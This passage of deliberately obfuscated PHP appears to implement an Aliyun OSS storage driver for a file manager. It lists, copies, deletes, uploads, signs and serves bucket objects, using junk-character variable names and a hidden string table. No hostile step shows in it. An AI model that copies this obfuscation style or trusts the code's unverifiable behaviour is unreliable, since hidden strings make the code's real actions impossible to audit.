$•ĞäÚ“Æ[1413] => $ˆ“’»Ô´, $•ĞäÚ“Æ[1414] => $ó‰çä¾ú, $•ĞäÚ“Æ[1415] => $è•ƒºƒ); try { $‚œ¦—œ = $this->client->listObjects($this->bucket, $ü×³ë¤); } catch (OSS\Core\OssException $½Ğ»Ê„µ) { break; } $è•ƒºƒ = $‚œ¦—œ->getNextMarker(); $ÄÔÒÓ¦ = $‚œ¦—œ->getObjectList(); $–÷·ß‘¦ = $‚œ¦—œ->getPrefixList(); foreach ($ÄÔÒÓ¦ as $®¼Õİ) { if ($®¼Õİ->getKey() == $ˆ“’»Ô´) { continue; } $şÏı¬–Ğ = $®¼Õİ->getKey(); $ÑÉ¹âÅ = $®¼Õİ->getSize(); $´¢òÃšè = $®¼Õİ->getLastModified(); $©áÏ°äâ = $Ş€–•«Ô ? array($•ĞäÚ“Æ[32] => $şÏı¬–Ğ, $•ĞäÚ“Æ[76] => $ÑÉ¹âÅ, $•ĞäÚ“Æ[180] => strtotime($´¢òÃšè)) : $şÏı¬–Ğ; $ş›ÊŠŠÚ = $ÑÉ¹âÅ == 0 && substr($şÏı¬–Ğ, strlen($şÏı¬–Ğ) - 1, 1) == $•ĞäÚ“Æ[8] ? !0 : !1; $¶Á„ŸÙ– = array($•ĞäÚ“Æ[76] => $ÑÉ¹âÅ, $•ĞäÚ“Æ[1416] => $ÑÉ¹âÅ, $•ĞäÚ“Æ[85] => strtotime($´¢òÃšè), $•ĞäÚ“Æ[1417] => $´¢òÃšè); $this->cacheMethodInfoSet($şÏı¬–Ğ, $ş›ÊŠŠÚ, $¶Á„ŸÙ–); if ($ş›ÊŠŠÚ) { $»õŸ¦•ú[] = $şÏı¬–Ğ; continue; } $âŠÑì‰¦[] = $©áÏ°äâ; } foreach ($–÷·ß‘¦ as $Ó¬´Şˆ”) { $»õŸ¦•ú[] = $Ó¬´Şˆ”->getPrefix(); $this->cacheMethodInfoSet($Ó¬´Şˆ”->getPrefix(), !0); } if ($è•ƒºƒ === $•ĞäÚ“Æ[12]) { break; } } $this->cacheMethodInfoSet($ŞçÃÏ, !0); return array($•ĞäÚ“Æ[82] => $»õŸ¦•ú, $•ĞäÚ“Æ[83] => $âŠÑì‰¦); } public function copyFile($øğÔÑÈŒ, $ˆş¥Ğ·) { $šêã±©Á = $this->size($øğÔÑÈŒ); if ($šêã±©Á < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $øğÔÑÈŒ, $this->bucket, $this->pathEncode($ˆş¥Ğ·)); } catch (OSS\Core\OssException $Ü¤¨»èË) { return !1; } return $this->getPathOuter($ˆş¥Ğ·); } $ÑÀ¶Õ‰¹ = $this->multiCopyObject($øğÔÑÈŒ, $ˆş¥Ğ·, $šêã±©Á); return $ÑÀ¶Õ‰¹ ? $this->getPathOuter($ˆş¥Ğ·) : !1; } private function multiCopyObject($áóÁà¾ó, $‚å¡íèï, $ßâÎìú) { $×§½¸½ =& $_SERVER[¹ş¤¶ĞÖ]; try { $¬ìÄğ² = array(); if ($ƒÃèâŸ = $this->hashMd5($áóÁà¾ó)) { $¬ìÄğ² = array(OSS\OssClient::OSS_HEADERS => array($×§½¸½[1418] => $ƒÃèâŸ)); } $¡›ıÁÔÃ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($‚å¡íèï), $¬ìÄğ²); $Œ•Åôûì = 1; $ºâÉ®ËÄ = 0; $Ò°ıå­¿ = array(); $’¸Õ×ˆì = 1024 * 1024 * 10; $§ºæüºÑ = $this->client->generateMultiuploadParts($ßâÎìú, $’¸Õ×ˆì); foreach ($§ºæüºÑ as $ç„Ìêõá => $ò©¦‚äŞ) { $²ù³›€ = $ºâÉ®ËÄ + (int) $ò©¦‚äŞ[$×§½¸½[1419]]; $³û°²œß = (int) $ò©¦‚äŞ[$×§½¸½[366]] + $²ù³›€ - 1; $ŒˆÔŒÁ = array($×§½¸½[1420] => $²ù³›€, $×§½¸½[1421] => $³û°²œß); $Ò°ıå­¿[] = $this->client->uploadPartCopy($this->bucket, $áóÁà¾ó, $this->bucket, $this->pathEncode($‚å¡íèï), $Œ•Åôûì, $¡›ıÁÔÃ, $ŒˆÔŒÁ); $Œ•Åôûì = $Œ•Åôûì + 1; } $îöÉ½ÚÜ = array(); foreach ($Ò°ıå­¿ as $ç„Ìêõá => $°èİÖ¬) { $îöÉ½ÚÜ[] = array($×§½¸½[1422] => $ç„Ìêõá + 1, $×§½¸½[1423] => $°èİÖ¬); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($‚å¡íèï), $¡›ıÁÔÃ, $îöÉ½ÚÜ); } catch (OSS\Core\OssException $Ô²ÀÅ®Á) { return !1; } return !0; } public function moveFile($¸ÎÖœ, $ô½­Îùà) { if ($this->copyFile($¸ÎÖœ, $ô½­Îùà)) { $this->remove($¸ÎÖœ); return $this->getPathOuter($ô½­Îùà); } return !1; } public function delFile($æöß®‡) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($æöß®‡)); } catch (OSS\Core\OssException $í™ÊàÃ) { return !1; } return !0; } public function delFolder($°ÆçÅ„Ú) { $¥¿®‘Î— =& $_SERVER[¹ş¤¶ĞÖ]; if (!$this->exist($°ÆçÅ„Ú)) { return !0; } $this->listItemCache = !1; $›Ã¼­Ú = $this->fileList($°ÆçÅ„Ú); $this->listItemCache = !0; $Ïìì€•Ã = trim($°ÆçÅ„Ú, $¥¿®‘Î—[8]) . $¥¿®‘Î—[8]; if (!empty($°ÆçÅ„Ú) && $°ÆçÅ„Ú !== $¥¿®‘Î—[198] && !in_array($Ïìì€•Ã, $›Ã¼­Ú[$¥¿®‘Î—[82]])) { $›Ã¼­Ú[$¥¿®‘Î—[82]][] = $Ïìì€•Ã; } $ü‘–à•Õ = $this->delByBatch($›Ã¼­Ú[$¥¿®‘Î—[83]]); if (!$ü‘–à•Õ) { return !1; } $ü‘–à•Õ = $this->delByBatch($›Ã¼­Ú[$¥¿®‘Î—[82]]); if (!$ü‘–à•Õ) { return !1; } return $this->delFile($Ïìì€•Ã); } private function delByBatch($ÀˆÜ¼) { foreach (array_chunk($ÀˆÜ¼, 1000) as $“„š¼É•) { try { $this->client->deleteObjects($this->bucket, $“„š¼É•); } catch (OSS\Core\OssException $Öãø€áÍ) { return !1; } } return !0; } public function rename($àŒ‚µ‚, $›®ÌåÆ€) { return $this->renameObject($àŒ‚µ‚, $›®ÌåÆ€); } private function fileInfo($ñ½ï˜ÅŠ, $êŸéáøŒ = false, $­‚¦ØŠÎ = array()) { $ı¦†•á³ =& $_SERVER[¹ş¤¶ĞÖ]; $¼Ë¥ˆÅŸ = array($ı¦†•á³[32] => $this->pathThis($ñ½ï˜ÅŠ), $ı¦†•á³[84] => $this->getPathOuter($ñ½ï˜ÅŠ), $ı¦†•á³[33] => $ı¦†•á³[200], $ı¦†•á³[76] => isset($­‚¦ØŠÎ[$ı¦†•á³[76]]) ? $­‚¦ØŠÎ[$ı¦†•á³[76]] : 0, $ı¦†•á³[174] => $this->ext($ñ½ï˜ÅŠ)); if ($êŸéáøŒ) { return $¼Ë¥ˆÅŸ; } $¼Ë¥ˆÅŸ[$ı¦†•á³[201]] = $¼Ë¥ˆÅŸ[$ı¦†•á³[85]] = 0; $¼Ë¥ˆÅŸ[$ı¦†•á³[202]] = $¼Ë¥ˆÅŸ[$ı¦†•á³[203]] = !0; if (empty($­‚¦ØŠÎ)) { $ò”«™¬á = $this->objectMeta($ñ½ï˜ÅŠ); if (!$ò”«™¬á) { return $¼Ë¥ˆÅŸ; } $­‚¦ØŠÎ = array($ı¦†•á³[85] => strtotime($ò”«™¬á[$ı¦†•á³[1417]]), $ı¦†•á³[76] => $ò”«™¬á[$ı¦†•á³[1416]] + 0); } if (isset($­‚¦ØŠÎ[$ı¦†•á³[76]])) { $¼Ë¥ˆÅŸ[$ı¦†•á³[76]] = $­‚¦ØŠÎ[$ı¦†•á³[76]]; } if (isset($­‚¦ØŠÎ[$ı¦†•á³[85]])) { $¼Ë¥ˆÅŸ[$ı¦†•á³[85]] = $­‚¦ØŠÎ[$ı¦†•á³[85]]; } if (isset($­‚¦ØŠÎ[$ı¦†•á³[180]]) && !trim($¼Ë¥ˆÅŸ[$ı¦†•á³[85]])) { $¼Ë¥ˆÅŸ[$ı¦†•á³[85]] = $­‚¦ØŠÎ[$ı¦†•á³[180]]; } return $¼Ë¥ˆÅŸ; } private function folderInfo($Û¿„‹İ, $Ôéæ€Ó© = false, $§ÒÆÁ¦Ò = array()) { $÷®é¤¨ =& $_SERVER[¹ş¤¶ĞÖ]; $³Ö‘²Ì´ = array($÷®é¤¨[32] => $this->pathThis($Û¿„‹İ), $÷®é¤¨[84] => $this->getPathOuter($÷®é¤¨[8] . $Û¿„‹İ), $÷®é¤¨[33] => $÷®é¤¨[75]); if ($Ôéæ€Ó©) { return $³Ö‘²Ì´; } $³Ö‘²Ì´[$÷®é¤¨[201]] = $³Ö‘²Ì´[$÷®é¤¨[85]] = 0; $³Ö‘²Ì´[$÷®é¤¨[202]] = $³Ö‘²Ì´[$÷®é¤¨[203]] = !0; if (empty($§ÒÆÁ¦Ò)) { $Û¿„‹İ = rtrim($Û¿„‹İ, $÷®é¤¨[8]) . $÷®é¤¨[8]; $¶Ñ¨‡õ¨ = $this->objectMeta($Û¿„‹İ); if (!$¶Ñ¨‡õ¨) { return $³Ö‘²Ì´; } $§ÒÆÁ¦Ò = array($÷®é¤¨[201] => $¶Ñ¨‡õ¨[$÷®é¤¨[531]][$÷®é¤¨[1424]], $÷®é¤¨[85] => strtotime($¶Ñ¨‡õ¨[$÷®é¤¨[1417]])); } if (isset($§ÒÆÁ¦Ò[$÷®é¤¨[85]])) { $³Ö‘²Ì´[$÷®é¤¨[85]] = $§ÒÆÁ¦Ò[$÷®é¤¨[85]]; } if (isset($§ÒÆÁ¦Ò[$÷®é¤¨[201]])) { $³Ö‘²Ì´[$÷®é¤¨[201]] = $§ÒÆÁ¦Ò[$÷®é¤¨[201]]; } return $³Ö‘²Ì´; } public function listPath($àÂàµÉÊ, $ƒ§Î‰¥‡ = false) { $³… ºÌ• =& $_SERVER[¹ş¤¶ĞÖ]; $…Ü¾Ú¦Ï = $this->fileList($àÂàµÉÊ, $³… ºÌ•[8], !0); foreach ($…Ü¾Ú¦Ï[$³… ºÌ•[82]] as $æö„è²Ş => $³üœÂò©) { $…Ü¾Ú¦Ï[$³… ºÌ•[82]][$æö„è²Ş] = $this->folderInfo($³üœÂò©, $ƒ§Î‰¥‡, $³üœÂò©); } foreach ($…Ü¾Ú¦Ï[$³… ºÌ•[83]] as $æö„è²Ş => $³üœÂò©) { $…Ü¾Ú¦Ï[$³… ºÌ•[83]][$æö„è²Ş] = $this->fileInfo($³üœÂò©[$³… ºÌ•[32]], $ƒ§Î‰¥‡, $³üœÂò©); } return $…Ü¾Ú¦Ï; } protected function infoChildren($¾ìÆ°¥½, &$Ïï™æµ¤) { $ìÍîûĞ =& $_SERVER[¹ş¤¶ĞÖ]; $âúşš… = $this->fileList($¾ìÆ°¥½, $ìÍîûĞ[12], !0); $Ïï™æµ¤[$ìÍîûĞ[78]] += count($âúşš…[$ìÍîûĞ[82]]); $Ïï™æµ¤[$ìÍîûĞ[77]] += count($âúşš…[$ìÍîûĞ[83]]); foreach ($âúşš…[$ìÍîûĞ[83]] as $–ÃçÂ†ô) { if (!$–ÃçÂ†ô || !$–ÃçÂ†ô[$ìÍîûĞ[76]]) { continue; } $Ïï™æµ¤[$ìÍîûĞ[76]] += $–ÃçÂ†ô[$ìÍîûĞ[76]]; } } public function has($·åòàåµ, $­Ëµ¼¢î = false, $Ç“ÊéŒì = true) { $Ø½àŒÆá =& $_SERVER[¹ş¤¶ĞÖ]; $·åòàåµ = trim($·åòàåµ, $Ø½àŒÆá[8]); $±ï“Œà° = empty($·åòàåµ) && $·åòàåµ !== $Ø½àŒÆá[198] ? $Ø½àŒÆá[12] : $·åòàåµ . $Ø½àŒÆá[8]; $ìõŞòÇ = $Ø½àŒÆá[12]; $Ãò¨ÛÄ = 500; $Â‡®ê©Ü = $à®®ü†Á = 0; while (!0) { check_abort(); $˜å¢½µŠ = array($Ø½àŒÆá[1412] => $Ø½àŒÆá[8], $Ø½àŒÆá[1413] => $±ï“Œà°, $Ø½àŒÆá[1414] => $Ãò¨ÛÄ, $Ø½àŒÆá[1415] => $ìõŞòÇ); try { $Ê³ÖÃÏ = $this->client->listObjects($this->bucket, $˜å¢½µŠ); } catch (OSS\Core\OssException $¨èÉÂ©®) { break; } $ìõŞòÇ = $Ê³ÖÃÏ->getNextMarker(); $Àá­åù² = $Ê³ÖÃÏ->getObjectList(); $ß€·Ğ» = $Ê³ÖÃÏ->getPrefixList(); if ($­Ëµ¼¢î) { if (count($Àá­åù²) > 1 || count($Àá­åù²) == 1 && $Àá­åù²[0]->getKey() != $±ï“Œà°) { $Â‡®ê©Ü += count($Àá­åù²) - 1; } if (!empty($ß€·Ğ»)) { $à®®ü†Á += count($ß€·Ğ»); } if ($ìõŞòÇ === $Ø½àŒÆá[12]) { break; } continue; } if ($Ç“ÊéŒì) { if (!empty($Àá­åù²)) { if (count($Àá­åù²) > 1 || $Àá­åù²[0]->getKey() != $±ï“Œà°) { return !0; } } } else { if (!empty($ß€·Ğ»)) { return !0; } } if ($ìõŞòÇ === $Ø½àŒÆá[12]) { break; } } if ($­Ëµ¼¢î) { return array($Ø½àŒÆá[207] => $Â‡®ê©Ü, $Ø½àŒÆá[208] => $à®®ü†Á); } return !1; } public function listAll($×İá«‚Å) { $ÏßúÍ­œ =& $_SERVER[¹ş¤¶ĞÖ]; $¢Æ¶¡ùÓ = $this->fileList($×İá«‚Å, $ÏßúÍ­œ[12], !0); $Û·âıÔ¬ = array_to_keyvalue($¢Æ¶¡ùÓ[$ÏßúÍ­œ[83]], $ÏßúÍ­œ[32]); foreach ($¢Æ¶¡ùÓ[$ÏßúÍ­œ[82]] as $…æéõÎæ) { if (is_string($…æéõÎæ)) { $Û·âıÔ¬[$…æéõÎæ] = array($ÏßúÍ­œ[76] => 0); } } return $this->listAllFiles($×İá«‚Å, $Û·âıÔ¬); } public function canRead($÷ÕÄÏ ç) { $…°çæÅò =& $_SERVER[¹ş¤¶ĞÖ]; $§ó‡ş× = $this->pathAcl($÷ÕÄÏ ç); return $§ó‡ş× == $…°çæÅò[1425] || $§ó‡ş× == $…°çæÅò[576] ? !0 : !1; } public function canWrite($¼í¥•ÜÒ) { $äÉ‰Ü†ş = $this->pathAcl($¼í¥•ÜÒ); return $äÉ‰Ü†ş == $_SERVER[¹ş¤¶ĞÖ][576] ? !0 : !1; } public function pathAcl($ìë“Õ) { $ŠÚ›àØİ =& $_SERVER[¹ş¤¶ĞÖ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $¢«©­â¸ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ìë“Õ)); } catch (OSS\Core\OssException $ÑÑÃÛèé) { return !1; } $ååËÏæ = $¢«©­â¸ == $ŠÚ›àØİ[37] ? $this->bucketAcl : $¢«©­â¸; if ($ååËÏæ == $ŠÚ›àØİ[1426]) { return $ŠÚ›àØİ[1425]; } if ($ååËÏæ == $ŠÚ›àØİ[1427]) { return $ŠÚ›àØİ[576]; } return $ååËÏæ; } private function chmodPath($ŒˆÚ£Õ, $Ô„­ÁÍ¸ = '') { $ô¡»˜š˜ =& $_SERVER[¹ş¤¶ĞÖ]; $®áƒ•ºè = empty($Ô„­ÁÍ¸) ? $ô¡»˜š˜[1427] : $Ô„­ÁÍ¸; $¸†¸‰†® = array($ô¡»˜š˜[37], $ô¡»˜š˜[199], $ô¡»˜š˜[1426], $ô¡»˜š˜[1427]); if (!in_array($®áƒ•ºè, $¸†¸‰†®)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ŒˆÚ£Õ), $®áƒ•ºè); } catch (OSS\Core\OssException $¬Ëõ¦ÊÏ) { return !1; } return !0; } public function getContent($å¡Ñ¦üŠ) { return $this->fileSubstr($å¡Ñ¦üŠ, -1); } public function setContent($ì÷ó‘½ü, $””³ôÚ– = '') { $±²¢Ùîú =& $_SERVER[¹ş¤¶ĞÖ]; try { $çÕßŸ¥‚ = $this->trafficLimit($±²¢Ùîú[1428]); $¦€ÉèÕ = $this->client->putObject($this->bucket, $this->pathEncode($ì÷ó‘½ü), $””³ôÚ–, $çÕßŸ¥‚); } catch (OSS\Core\OssException $ÙÊ©’ñ‡) { return !1; } $¡¤Œ´š = array($±²¢Ùîú[1418] => trim($¦€ÉèÕ[$±²¢Ùîú[1429]], $±²¢Ùîú[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ì÷ó‘½ü))); $this->updateObjMeta($ì÷ó‘½ü, $¡¤Œ´š); return isset($¦€ÉèÕ[$±²¢Ùîú[1430]][$±²¢Ùîú[260]]) ? !0 : !1; } private function updateObjMeta($à¤Ñ¨Õı, $õÑª¸È) { $à¤Ñ¨Õı = $this->pathEncode($à¤Ñ¨Õı); try { $–“…—§¹ = array(OSS\OssClient::OSS_HEADERS => $õÑª¸È); $this->client->copyObject($this->bucket, $à¤Ñ¨Õı, $this->bucket, $à¤Ñ¨Õı, $–“…—§¹); } catch (OSS\Core\OssException $•²ªÀµå) { return !1; } return !0; } public function upload($—à ½±, $›şÀÃÖ’, $Ùß¨ş³ = false, $èçôØ Ø = REPEAT_REPLACE) { $ÈùÁş¼Œ =& $_SERVER[¹ş¤¶ĞÖ]; $ÙÅóú¾ = trim($—à ½±, $ÈùÁş¼Œ[8]); $Õ ËãÊî = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($ÈùÁş¼Œ[1418] => @md5_file($›şÀÃÖ’)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($—à ½±))); $Õ ËãÊî = $this->trafficLimit($ÈùÁş¼Œ[1428], $Õ ËãÊî); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ÙÅóú¾), $›şÀÃÖ’, $Õ ËãÊî); } catch (OSS\Core\OssException $™øÕ›Ñ) { return !1; } return $this->getPathOuter($—à ½±); } public function getHost() { $ôä«— =& $_SERVER[¹ş¤¶ĞÖ]; $â€ó—ªÒ = explode($ôä«—[184], parent::getHost()); return $â€ó—ªÒ[0] . $ôä«—[184] . $this->bucket . $ôä«—[10] . $â€ó—ªÒ[1]; } public function uploadFormData($‹ı¨µÚš, $Şøâ€†˜ = 3600) { $Ñâ“ĞÏÖ =& $_SERVER[¹ş¤¶ĞÖ]; if (!($Ïî›¥¦ = $this->getHost())) { return !1; } $òÄ¢Şòç = $Şøâ€†˜; $†ĞŸû³ = date($Ñâ“ĞÏÖ[1431], time() + $òÄ¢Şòç); $ğ€Ç˜áë = new DateTime($†ĞŸû³); $³ æ«øÍ = $ğ€Ç˜áë->format(DateTime::ISO8601); $ßÙà¥Óç = strpos($³ æ«øÍ, $Ñâ“ĞÏÖ[325]); $³ æ«øÍ = substr($³ æ«øÍ, 0, $ßÙà¥Óç) . $Ñâ“ĞÏÖ[1432]; $ÕÔÖ÷›± = 1048576000 * 5; $òÍÈš†÷ = $this->pathFather($‹ı¨µÚš); $”‹öÅÅ¢ = array($Ñâ“ĞÏÖ[243] => $³ æ«øÍ, $Ñâ“ĞÏÖ[246] => array(array($Ñâ“ĞÏÖ[1433], 0, $ÕÔÖ÷›±), array($Ñâ“ĞÏÖ[249], $Ñâ“ĞÏÖ[250], $òÍÈš†÷))); $ŠˆÖ¦ú = base64_encode(json_encode($”‹öÅÅ¢)); $³Êóµ‘ = base64_encode(hash_hmac($Ñâ“ĞÏÖ[232], $ŠˆÖ¦ú, $this->secret, !0)); $î‹±Çàå = array($Ñâ“ĞÏÖ[261] => $ŠˆÖ¦ú, $Ñâ“ĞÏÖ[1434] => $this->accessKey, $Ñâ“ĞÏÖ[253] => $Ñâ“ĞÏÖ[242], $Ñâ“ĞÏÖ[1435] => $³Êóµ‘, $Ñâ“ĞÏÖ[182] => $Ïî›¥¦); $î‹±Çàå = $this->trafficLimit($Ñâ“ĞÏÖ[1428], $î‹±Çàå); return $î‹±Çàå; } public function multiUploadFormData($íüü»ôª, $œ¾¢Ø©² = 3600) { $İï¡Âª­ =& $_SERVER[¹ş¤¶ĞÖ]; if (!($–íÙÚì¡ = $this->getHost())) { return !1; } $ æˆ—ÃÎ = $this->trafficLimit($İï¡Âª­[1428]); $‘ë•†ŞÌ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($íüü»ôª), $ æˆ—ÃÎ); return array($İï¡Âª­[223] => $‘ë•†ŞÌ, $İï¡Âª­[182] => $–íÙÚì¡ . $İï¡Âª­[8] . $this->pathEncode($íüü»ôª), $İï¡Âª­[224] => gmdate($İï¡Âª­[1436]), $İï¡Âª­[94] => $íüü»ôª); } public function multiUploadAuthData($ßìÁ×âì, $ğ¹„î˜û = array()) { $ËÇ…†¬Ş =& $_SERVER[¹ş¤¶ĞÖ]; $Ô—›„Ö = isset($ğ¹„î˜û[$ËÇ…†¬Ş[224]]) ? $ğ¹„î˜û[$ËÇ…†¬Ş[224]] : gmdate($ËÇ…†¬Ş[1436]); $á£¨÷ = isset($ğ¹„î˜û[$ËÇ…†¬Ş[174]]) ? $ğ¹„î˜û[$ËÇ…†¬Ş[174]] : $ËÇ…†¬Ş[12]; $¼×µÛ®ë = $ßìÁ×âì; if (isset($ğ¹„î˜û[$ËÇ…†¬Ş[94]])) { $¼×µÛ®ë = $ğ¹„î˜û[$ËÇ…†¬Ş[94]]; unset($ğ¹„î˜û[$ËÇ…†¬Ş[94]]); } if (isset($ğ¹„î˜û[$ËÇ…†¬Ş[225]])) { $ğ¹„î˜û[$ËÇ…†¬Ş[224]] = $Ô—›„Ö; return $this->listUploadParts($¼×µÛ®ë, $ğ¹„î˜û); } $¦È©ª¿™ = array($ËÇ…†¬Ş[226], $ËÇ…†¬Ş[12], $ËÇ…†¬Ş[120], $Ô—›„Ö, "\x78\x2d\x6f\163\x73\55\144\141\164\145\x3a{$Ô—›„Ö}", $ËÇ…†¬Ş[8] . $this->bucket . $ËÇ…†¬Ş[8] . $¼×µÛ®ë . $á£¨÷); if (strpos($á£¨÷, $ËÇ…†¬Ş[227]) === 0) { $¦È©ª¿™[0] = $ËÇ…†¬Ş[228]; if ($£İáñ¿Ò = $this->trafficLimit($ËÇ…†¬Ş[1428])) { $¼×µÛ®ë = $ËÇ…†¬Ş[1437]; array_splice($¦È©ª¿™, 5, 0, $¼×µÛ®ë . $ËÇ…†¬Ş[4] . $£İáñ¿Ò[$¼×µÛ®ë]); } } if (isset($ğ¹„î˜û[$ËÇ…†¬Ş[229]]) && $ğ¹„î˜û[$ËÇ…†¬Ş[229]] == $ËÇ…†¬Ş[230]) { $¦È©ª¿™[0] = $ËÇ…†¬Ş[230]; } if (!empty($ğ¹„î˜û[$ËÇ…†¬Ş[1438]])) { $¥É¿»ßè = array_merge(array($¦È©ª¿™[4]), $ğ¹„î˜û[$ËÇ…†¬Ş[1438]]); sort($¥É¿»ßè); $¦È©ª¿™[4] = implode($ËÇ…†¬Ş[231], $¥É¿»ßè); } $ºÒ’İ¥ = implode($ËÇ…†¬Ş[231], $¦È©ª¿™); $ÏÆœø¿§ = base64_encode(hash_hmac($ËÇ…†¬Ş[232], $ºÒ’İ¥, $this->secret, !0)); $ˆ‘Øôú… = $ËÇ…†¬Ş[1402] . $this->accessKey . $ËÇ…†¬Ş[4] . $ÏÆœø¿§; if (strpos($á£¨÷, $ËÇ…†¬Ş[227]) === 0) { $ˆ‘Øôú… = array($ËÇ…†¬Ş[234] => $ˆ‘Øôú…, $ËÇ…†¬Ş[224] => $Ô—›„Ö); if ($£İáñ¿Ò) { $ˆ‘Øôú… = array_merge($ˆ‘Øôú…, $£İáñ¿Ò); } } return $ˆ‘Øôú…; } public function listUploadParts($ĞÅõªÄ–, $€®‹ÀĞÍ) { $í¦“¶ÁÕ =& $_SERVER[¹ş¤¶ĞÖ]; $ûàÍ„ëñ = parse_url_query($€®‹ÀĞÍ[$í¦“¶ÁÕ[174]]); $Áşä‡¯ = $this->client->listParts($this->bucket, $this->pathEncode($ĞÅõªÄ–), $ûàÍ„ëñ[$í¦“¶ÁÕ[223]]); $ù…Ô½„ = $Áşä‡¯->getListPart(); $‡°¦®®Ã = array(); foreach ($ù…Ô½„ as $òÍ®ù£ş) { $‡°¦®®Ã[] = array($í¦“¶ÁÕ[1422] => $òÍ®ù£ş->getPartNumber(), $í¦“¶ÁÕ[1423] => trim($òÍ®ù£ş->getETag(), $í¦“¶ÁÕ[118])); } unset($€®‹ÀĞÍ[$í¦“¶ÁÕ[225]], $€®‹ÀĞÍ[$í¦“¶ÁÕ[229]]); $êØø¬ú‹ = $this->multiUploadAuthData($ĞÅõªÄ–, $€®‹ÀĞÍ); if (empty($êØø¬ú‹)) { return !1; } return array($í¦“¶ÁÕ[234] => $êØø¬ú‹, $í¦“¶ÁÕ[224] => $€®‹ÀĞÍ[$í¦“¶ÁÕ[224]], $í¦“¶ÁÕ[236] => $‡°¦®®Ã); } public function download($ñ­îş¤û, $Òƒ¾æØ) { if ($this->isFolder($ñ­îş¤û)) { return !1; } try { $Ç»‚º•Å = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Òƒ¾æØ); $Ç»‚º•Å = $this->trafficLimit($_SERVER[¹ş¤¶ĞÖ][109], $Ç»‚º•Å); $this->client->getObject($this->bucket, $this->pathEncode($ñ­îş¤û), $Ç»‚º•Å); } catch (OSS\Core\OssException $™»°Ã®–) { return !1; } return $Òƒ¾æØ; } public function fileSubstr($ô«¡ÊÁ, $ •–¡´Ä = 0, $¡Î°Œöà = false) { if ($ •–¡´Ä === -1) { $ï¨’Â± = array(); } else { if ($¡Î°Œöà === !1) { $ãşÔ»âÖ = $this->size($ô«¡ÊÁ); } else { $ãşÔ»âÖ = $ •–¡´Ä + $¡Î°Œöà - 1; } $ï¨’Â± = array(OSS\OssClient::OSS_RANGE => "{$ •–¡´Ä}\x2d{$ãşÔ»âÖ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ô«¡ÊÁ), $ï¨’Â±); } catch (OSS\Core\OssException $“íù¿÷ ) { think_exception($“íù¿÷ ->getMessage()); return !1; } } private function trafficLimit($ºÍ´µîş, $ò’º‘æ† = array()) { $õúÀ­Àù =& $_SERVER[¹ş¤¶ĞÖ]; if ($ºÍ´µîş == $õúÀ­Àù[1428] && $this->isUploadServer() || $ºÍ´µîş == $õúÀ­Àù[109] && $this->isFileOutServer()) { return $ò’º‘æ†; } $ç¯Ö¼Ìœ = floatval($GLOBALS[$õúÀ­Àù[6]][$õúÀ­Àù[89]][$õúÀ­Àù[107]][$ºÍ´µîş]) * 1024 * 1024 * 8; if (!$ç¯Ö¼Ìœ) { return $ò’º‘æ†; } $ç¯Ö¼Ìœ = $ç¯Ö¼Ìœ < 819200 ? 819200 : ($ç¯Ö¼Ìœ > 838860800 ? 838860800 : $ç¯Ö¼Ìœ); $ò’º‘æ†[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ç¯Ö¼Ìœ); return $ò’º‘æ†; } public function link($ã¡«Ú®, $«¨æŒáà = array()) { $öİ¨º˜Ó =& $_SERVER[¹ş¤¶ĞÖ]; if (!$this->exist($ã¡«Ú®) || $this->isFolder($ã¡«Ú®)) { return !1; } try { $«¨æŒáà = $this->trafficLimit($öİ¨º˜Ó[109], $«¨æŒáà); $Ô•ùÖ = $this->client->signUrl($this->bucket, $this->pathEncode($ã¡«Ú®), 3600 * 12, $öİ¨º˜Ó[230], $«¨æŒáà); return $this->getCdnLink($Ô•ùÖ); } catch (OSS\Core\OssException $‹šÓˆõ©) { return !1; } } public function fileOut($´ÙÜ¥‚à, $çÔ×Ó÷” = false, $ĞâÍû“¥ = false, $‹‡¿—¨¸ = '') { $µÆÚÌ«Ä =& $_SERVER[¹ş¤¶ĞÖ]; if ($this->isFileOutServer()) { return $this->fileOutServer($´ÙÜ¥‚à, $çÔ×Ó÷”, $ĞâÍû“¥, $‹‡¿—¨¸); } if (!$ĞâÍû“¥) { $ĞâÍû“¥ = $this->pathThis($´ÙÜ¥‚à); } $ĞâÍû“¥ = rawurlencode($ĞâÍû“¥); $òşó¡Øş = get_file_mime(get_path_ext($ĞâÍû“¥)); if ($òşó¡Øş == $µÆÚÌ«Ä[217]) { return parent::fileOut($´ÙÜ¥‚à, $çÔ×Ó÷”, $ĞâÍû“¥, $‹‡¿—¨¸); } $çÔ×Ó÷” = $çÔ×Ó÷” ? $µÆÚÌ«Ä[1439] : $µÆÚÌ«Ä[1440]; $ÎÈÌç„‹ = array(OSS\OssClient::OSS_SUB_RESOURCE => $µÆÚÌ«Ä[1441] . rawurlencode("{$çÔ×Ó÷”}\73\x66\151\154\x65\x6e\x61\x6d\145\x3d{$ĞâÍû“¥}")); $ÎÈÌç„‹[OSS\OssClient::OSS_SUB_RESOURCE] .= $µÆÚÌ«Ä[1442] . rawurlencode($òşó¡Øş); $®Á¥˜Àü = $this->link($´ÙÜ¥‚à, $ÎÈÌç„‹); $this->fileOutLink($®Á¥˜Àü); } public function fileOutServer($ºİî¸Å, $¬îĞ¾Õ™ = false, $ş„çˆ = false, $¬ŠÒ¸€Ó = '') { parent::fileOut($ºİî¸Å, $¬îĞ¾Õ™, $ş„çˆ, $¬ŠÒ¸€Ó); } public function fileOutImage($Æ¯¤ø©ƒ, $ôÃ‡¿â = 250) { if ($this->size($Æ¯¤ø©ƒ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Æ¯¤ø©ƒ, $ôÃ‡¿â); } 